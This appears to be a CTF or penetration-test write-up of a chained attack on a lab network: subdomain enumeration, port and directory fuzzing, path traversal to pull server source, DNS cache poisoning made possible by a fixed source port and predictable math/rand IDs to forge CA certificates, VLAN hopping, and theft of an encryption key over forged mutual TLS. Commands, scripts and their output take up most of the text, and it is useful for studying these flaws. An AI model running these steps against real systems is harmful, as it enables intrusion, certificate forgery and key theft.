# Attack

## Reconnaissance

We begin our reconnaissance phase by enumerating DNS records for the `internal` TLD. We wrote the `dnscan.sh` utility to iterate over a wordlist and attempt an `A` query for each possible subdomain.

```bash
#!/bin/bash
# dnscan.sh
# Usage: ./dnscan.sh <domain> <wordlist>

# Check for 2 args
if [ $# -ne 2 ]; then
  echo "Usage: $0 <domain> <wordlist>"
  exit 1
fi

# For line in file
while read -r line; do
  {
    resp=$(dig +short "$line.$1")
    if [ -n "$resp" ]; then
      echo "$line.$1 -> $resp"
    fi
  } &
done <$2
wait
```

We run `dnscan.sh` to begin subdomain enumeration for the `internal` TLD, providing a list of the [top 10,000 common subdomains](https://github.com/rbsec/dnscan).

```bash
pwn:~$ ./dnscan.sh internal subdomains-10000.txt 
api.internal -> 10.64.10.1
dns.internal -> 10.64.10.2
ca.internal -> 10.64.10.3
keyserver.internal -> 172.16.10.1
```

We see a few hosts within our local 10.64.10.x network, and `keyserver.internal` in another network.

Beginning with the CA, we scan for open ports with a TCP SYN scan:

```bash
pwn:~$ sudo nmap -sS ca.internal
Starting Nmap 7.80 ( https://nmap.org ) at 2022-11-07 23:20 UTC
Nmap scan report for ca.internal (10.64.10.3)
Host is up (0.00011s latency).
Not shown: 998 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
443/tcp open  https
MAC Address: 52:54:00:00:05:38 (QEMU virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.10 seconds
```

The scan turns up port 22 running SSH, and 443 running an HTTPS webserver. We focus on the webserver for this attack.

Examining the headers returned from a GET request yields a hint towards what software the server is running:

```bash
pwn:~$ curl -I https://ca.internal
HTTP/1.1 404 Not Found
Server: digishue-go
Date: Tue, 08 Nov 2022 03:34:43 GMT
Content-Type: text/plain; charset=utf-8
Content-Length: 13
```

The `Server` header indicates the server is running `digishue-go`, likely a CA implementation for DigiShue in the Go programming language.

## Enumerating the CA webserver

We can use the `wfuzz` tool to enumerate common webserver directories. We supply a wordlist of common webserver directories and ignore 404 status codes for files or directories that are not found. The `FUZZ` keyword specifies where in the URL to fuzz with the contents of the wordlist.

```bash
pwn:~$ wfuzz -w directory-list-2.3-small.txt --hc 404 https://ca.internal/FUZZ
<truncated>
ID           Response   Lines    Word     Chars       Payload
000000269:   200        47 L     111 W    1110 Ch     "static" 
000001430:   405        0 L      3 W      18 Ch       "request"
000011792:   405        0 L      3 W      18 Ch       "validate"
<truncated>
```

The `static` endpoint returns far more bytes, so we begin here. Requesting this URL returns a YAML file:

```bash
pwn:~$ curl https://ca.internal/static
openapi: 3.0.1
info:
  title: DigiShue Certificate Authority
  version: 1.0.0
servers:
- url: https://ca.internal
paths:
  /request:
    post:
      summary: Request a certificate for a given domain
      parameters:
        - in: query
          name: domain
          required: true
          schema:
            type: string
          description: The domain to request a certificate for
      responses:
        '200':
          description: TXT challenge string

  /validate:
    post:
      summary: Validate a domain's DNS challenge and issue a certificate 
      parameters:
        - in: query
          name: domain
          required: true
          schema:
            type: string
          description: Domain to validate
      responses:
        '200':
          description: PEM encoded certificate and private key

  /static:
    post:
      summary: Retrieve a static asset
      parameters:
        - in: query
          name: path
          schema:
            type: string
          description: Static asset to retrieve
      responses:
        '200':
          description: Static asset
```

This appears to be an OpenAPI specification manifest; a standard for describing REST APIs. The CA likely uses this manifest to aid developers in integrating with their service. The manifest defines the API endpoints and parameters available to interact with the CA.

The `/static` endpoint contains the optional query parameter `path` that describes the static asset that the user wants to retrieved. Providing a test string returns a 500 error code and a rich error message indicating that the file cannot be found.

```bash
pwn:~$ curl -i https://ca.internal/static?path=test
HTTP/1.1 500 Internal Server Error
Server: digishue-go
Date: Tue, 08 Nov 2022 03:45:06 GMT
Content-Type: text/plain; charset=utf-8
Content-Length: 43

open static/test: no such file or directory
```

The server appears to substitute the path value into a filename. Modifying our query value with a URL encoded representation of `../`  path traversal causes a far more interesting error:

```bash
pwn:~$ curl -i https://ca.internal/static?path=..%2f
HTTP/1.1 500 Internal Server Error
Server: digishue-go
Date: Tue, 08 Nov 2022 03:45:31 GMT
Content-Type: text/plain; charset=utf-8
Content-Length: 31

read static/../: is a directory
```

Instead of failing to access a nonexistent file, path traversal resets the path one parent level above `static`, therefore instructing the server to read a directory as a file. This throws a `is a directory` error, indicating the server may be vulnerable to path traversal.

### CA Vulnerability 1: Local file inclusion via directory traversal in /static path parameter [V-CA-01]

Combining our prior knowledge that the server may be running Go with a path traversal exploit, we continue API enumeration by fuzzing for Go source code files. We invoke `wfuzz` and supply the `--hc 500` flag to ignore server error 500s.

```bash
pwn:~$ wfuzz -w directory-list-2.3-small.txt --hc 500 https://ca.internal/static?path=../FUZZ.go
ID           Response   Lines    Word     Chars       Payload                       
000000077:   200        167 L    421 W    3720 Ch     "main"
000000624:   200        123 L    351 W    2955 Ch     "crypto"
000004213:   200        67 L     186 W    1385 Ch     "challenge"
```

We have 3 valid HTTP 200 OK responses, so we manually substitute the filenames to download each file:

```bash
curl -so main.go http://10.64.10.3:8080/static?path=../main.go
curl -so crypto.go http://10.64.10.3:8080/static?path=../crypto.go
curl -so challenge.go http://10.64.10.3:8080/static?path=../challenge.go
```

Viewing the files reveals that we've successfully exfiltrated the source code for the certificate authority.

## Source Code Examination

The `/validate` handler is defined in `main.go`, and aligns with the expected functionality documented by the OpenAPI spec that we retrieved earlier. It reads a domain as a URL parameter and attempts to validate domain ownership via a DNS challenge.

```go
app.Post("/validate", func(c *fiber.Ctx) error {
	// Retrieve domain parameter
	domain := c.Query("domain")
	if domain == "" {
		return c.Status(400).SendString("missing domain parameter")
	}

	// Query DNS for challenge string
	challenge, err := dnsChallenge(domain)
	if err != nil {
		return c.Status(500).SendString(err.Error())
	}

	// Compare challenge string
	if challenge != pendingValidations[domain] {
		return c.Status(400).SendString("invalid challenge")
	}

	<truncated>
})
```

The `dnsChallenge` function is defined in `challenge.go` and contains `_acme-challenge` - a recognizable string from the ACME protocol. The Automatic Certificate Management Environment (commonly referred to as the ACME protocol) is a standard to securely and validate domain ownership and issue certificates in an automated manner. `dnsChallenge` appears to implement the `dns-01` challenge as defined in  [RFC 8555 section 8.4](https://www.rfc-editor.org/rfc/rfc8555.html#section-8.4). The function makes a TXT query for `"_acme-challenge." + domain` and returns the challenge value back to the `/validate` handler.

The function creates a DNS message and sends it to a resolver:

```go
func dnsChallenge(domain string) (string, error) {
	var (
		local  = net.ParseIP("10.64.10.3")
		remote = net.ParseIP("10.64.10.2")
	)

	m := new(dns.Msg)
	m.Id = uint16(rand.Intn(65535))
	m.RecursionDesired = true
	m.Question = []dns.Question{{
		Name:   dns.Fqdn("_acme-challenge." + domain),
		Qtype:  dns.TypeTXT,
		Qclass: dns.ClassINET,
	}}

	conn, err := net.DialUDP(
		"udp",
		&net.UDPAddr{IP: local, Port: 50000},
		&net.UDPAddr{IP: remote, Port: 53},
	)
	if err != nil {
		return "", err
	}
	defer conn.Close()

	client := dns.Client{Net: "udp"}
	r, _, err := client.ExchangeWithConn(m, &dns.Conn{Conn: conn})
	if err != nil {
		return "", err
	}

	if r.Rcode != dns.RcodeSuccess {
		return "", fmt.Errorf("DNS query failed: %s", dns.RcodeToString[r.Rcode])
	}

	if len(r.Answer) == 0 {
		return "", fmt.Errorf("no answer")
	}

	if t, ok := r.Answer[0].(*dns.TXT); !ok {
		return "", fmt.Errorf("unexpected answer type: %T", r.Answer[0])
	} else {
		return t.Txt[0], nil
	}
}
```

There are two critical flaws in this implementation. The outgoing DNS message is sent with a hardcoded UDP source port, and the message ID is randomized with a deterministic pseudorandom number generator (PRNG), reducing entropy low enough to enable DNS answer forgery through response poisoning.

### CA Vulnerability 2: DNS challenge uses a constant UDP source port [V-CA-02]

*RFC 5452 Measures for Making DNS More Resilient against Forged Answers* recommends using random UDP source port numbers due to low entropy concerns:

> This document recommends the use of UDP source port number
> randomization to extend the effective DNS transaction ID beyond the
> available 16 bits. [RFC 5452 section 10](https://www.rfc-editor.org/rfc/rfc5452#section-10)

Knowing the source port is always 50000, the available entropy is now limited to the DNS message ID field (a 16-bit identifier). RFC 5452 notes that some implementations only use 14 bits, further reducing entropy required to forge a response.

> The DNS ID field is 16 bits wide, meaning that if full use is made of
> all these bits, and if their contents are truly random, it will
> require on average 32768 attempts to guess. Anecdotal evidence
> suggests there are implementations utilizing only 14 bits, meaning on
> average 8192 attempts will suffice. [RFC 5452 section 4.3](https://www.rfc-editor.org/rfc/rfc5452#section-4.3)

### CA Vulnerability 3: Deterministic PRNG and constant seed for generating DNS message ID in DNS challenge [V-CA-03]

The `dnsChallenge` function sets the outgoing message ID with `uint16(rand.Intn(65535))` from the `math/rand` package. This is dangerous because `math/rand` is deterministic. The Go documentation for `math/rand` warns against using the package for secure operations:

> This package's outputs might be easily predictable regardless of how it's seeded. For random numbers suitable for security-sensitive work, see the crypto/rand package. [pkg.go.dev math/rand](https://pkg.go.dev/math/rand)

Furthermore, the PRNG is never manually seeded. The random source uses "precooked" values generated by [gen_cooked.go from math/rand](https://cs.opensource.google/go/go/+/refs/tags/go1.19.3:src/math/rand/gen_cooked.go), so with a default seed, all numbers are trivially and repeatably predictable. The n'th `rand.Intn(65535)` call will return the same value regardless of the value of n or the host system. It is not as simple as calling `rand.Intn(65535)` to exploit this vulnerability however.

The CA uses the `randHex` function defined in `challenge.go` to generate an random string used to validate domain ownership.

```go
func randHex() string {
   const letters = "0123456789abcdef"
   b := make([]byte, 32)
   for i := range b {
      b[i] = letters[rand.Intn(len(letters))]
   }
   return string(b)
}
```

This function calls `rand.Intn` in a loop over a 32 byte slice, so we need to drain 32 integers from the exploit host's PRNG before attempting to forge a response to the CA.

## Developing a chained exploit path

We have identified three vulnerabilities in the DigiShue Certificate Authority API:


V-CA-01: Local file inclusion via directory traversal in /static path parameter

V-CA-02: DNS challenge uses a constant UDP source port

V-CA-03: Deterministic PRNG and constant seed for generating DNS message ID in DNS challenge

We combined V-CA-02 and V-CA-03 in an exploit to fraudulently obtain a certificate for any domain; in this case `admin.internal`.

```bash
pwn:~$ sudo ./exploit -d admin.internal
2022/11/08 05:39:50 Preparing DNS poisoner
2022/11/08 05:39:50 Creating pwn0 interface with 10.64.10.2
2022/11/08 05:39:50 Fetching validation token
2022/11/08 05:39:50 Draining RNG entropy pool
2022/11/08 05:39:50 Serialized DNS response for TXT [1f7b169c846f218ab552fa82fbf86758] id 11807
2022/11/08 05:39:50 Sending DNS responses to 10.64.10.3:50000
2022/11/08 05:39:50 Waiting for DNS cache poisoning
2022/11/08 05:39:51 Validating token with CA
2022/11/08 05:39:57 Wrote admin.internal-crt.pem and admin.internal-key.pem
2022/11/08 05:39:57 Stopped DNS poisoner
```

The exploit program takes less than 10 seconds to run and is entirely automated. The program works as follows:

1. Request validation token from CA
2. Drain entropy pool and predict next DNS message ID
3. Serialize and create a DNS packet with predicted message ID
4. Flood DNS packet to poison the CA's DNS cache
5. Request certificate validation and retrieve issued certificate
6. Write cert and key to disk for later use

We can validate that the certificate is signed by the CA:

```
pwn:~$ openssl verify -CAfile DigiShue_CA.pem admin.internal-crt.pem
admin.internal-crt.pem: OK
```

At this point we now have fraudulently obtained a valid certificate and corresponding private key for `admin.internal`.

## Compromise key server network and extract cookie encryption key

We now turn our focus to the host `keyserver.internal`, discovered by DNS subdomain enumeration during reconnaissance.

Attempting a route lookup for `172.16.10.1` reveals that the host is unreachable from our network:

```
pwn:~$ ip route show 172.16.10.1
```

We continue by running a packet capture with VLAN decoding enabled to look for any traffic visible to our attacker machine:

```bash
pwn:~$ sudo tcpdump -i ens3 -n -e vlan
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on ens3, link-type EN10MB (Ethernet), capture size 262144 bytes
14:25:35.396015 52:54:00:00:05:36 > 33:33:00:00:00:02, ethertype 802.1Q (0x8100), length 74: vlan 10, p 0, ethertype IPv6, fe80::5054:ff:fe00:536 > ff02::2: ICMP6, router solicitation, length 16
```

After a few minutes, a 802.1Q frame appears on the wire, tagged with VLAN 10. This aligns with the common network practice of encoding a VLAN tag into the third octet of an IPv4 address; notably the 10 in `172.16.10.1`.

### Network Vulnerability 1: Unprotected trunk ports [V-NET-01]

Next, we create an interface to hop into VLAN 10:

```bash
pwn:~$ sudo ip link add link ens3 name ens3.10 type vlan id 10
pwn:~$ sudo ip addr  add dev ens3.10 172.16.10.200/24
pwn:~$ sudo ip link set dev ens3.10 up
```

The key server is now reachable:

```bash
pwn:~$ ping -c 1 keyserver.internal
PING keyserver.internal (172.16.10.1) 56(84) bytes of data.
64 bytes from 172.16.10.1 (172.16.10.1): icmp_seq=1 ttl=64 time=0.820 ms

--- keyserver.internal ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.820/0.820/0.820/0.000 ms
```

We continue enumerating the network by querying the 172.16.10.0/24 network for PTR records:

```bash
#!/bin/bash
# ptrecon.sh

for i in {0..255}; do
  {
    resp=$(dig +short -x "172.16.10.$i")
    if [ -n "$resp" ]; then
      echo "172.16.10.$i -> $resp"
    fi
  } &
done
wait
```

Running the `ptrecon.sh` script discovers a PTR record pointing `172.16.10.2` to `api.internal`:

```bash
pwn:~$ ./ptrecon.sh
172.16.10.1 -> keyserver.internal.
172.16.10.2 -> api.internal.
```

By this point it appears this network is intended for the API and key server to communicate directly.

Attempting to connect to the server throws a `bad certificate` error, likely meaning the client failed to provide a valid TLS certificate for mutual TLS authentication.

```bash
pwn:~$ curl https://keyserver.internal
curl: (56) OpenSSL SSL_read: error:14094412:SSL routines:ssl3_read_bytes:sslv3 alert bad certificate, errno 0
```

Using our combined V-CA-02 and V-CA-03 exploit, we're able to generate a certificate to impersonate the API and retry a request to the key server, this time authenticated as `api.internal`, yielding a successful HTTP query.

```bash
pwn:~$ sudo ./exploit -d api.internal
2022/11/08 19:15:57 Preparing DNS poisoner
2022/11/08 19:15:57 Creating pwn0 interface with 10.64.10.2
2022/11/08 19:15:57 Fetching validation token
2022/11/08 19:15:57 Serializing DNS packet
2022/11/08 19:15:57 Serialized DNS response for TXT [1f7b169c846f218ab552fa82fbf86758] id 11807
2022/11/08 19:15:57 Sending DNS responses to 10.64.10.3:50000
2022/11/08 19:15:57 Waiting for DNS cache poisoning
sud2022/11/08 19:15:58 Validating token with CA
2022/11/08 19:16:02 Wrote api.internal-crt.pem and api.internal-key.pem
2022/11/08 19:16:02 Stopped DNS poisoner
pwn:~$ curl https://keyserver.internal --key api.internal-key.pem --cert api.internal-crt.pem 
dce1360e4bc9a3a929a9dd5115e7977faac1f514febcf18fc036eebe3dffbc02
pwn:~$ curl https://keyserver.internal --key api.internal-key.pem --cert api.internal-crt.pem 
dce1360e4bc9a3a929a9dd5115e7977faac1f514febcf18fc036eebe3dffbc02
pwn:~$ curl https://keyserver.internal --key api.internal-key.pem --cert api.internal-crt.pem 
dce1360e4bc9a3a929a9dd5115e7977faac1f514febcf18fc036eebe3dffbc02
```

Retrying the request a few times returns the same 64 character hex string. This appears to be a key used by the API for encryption.
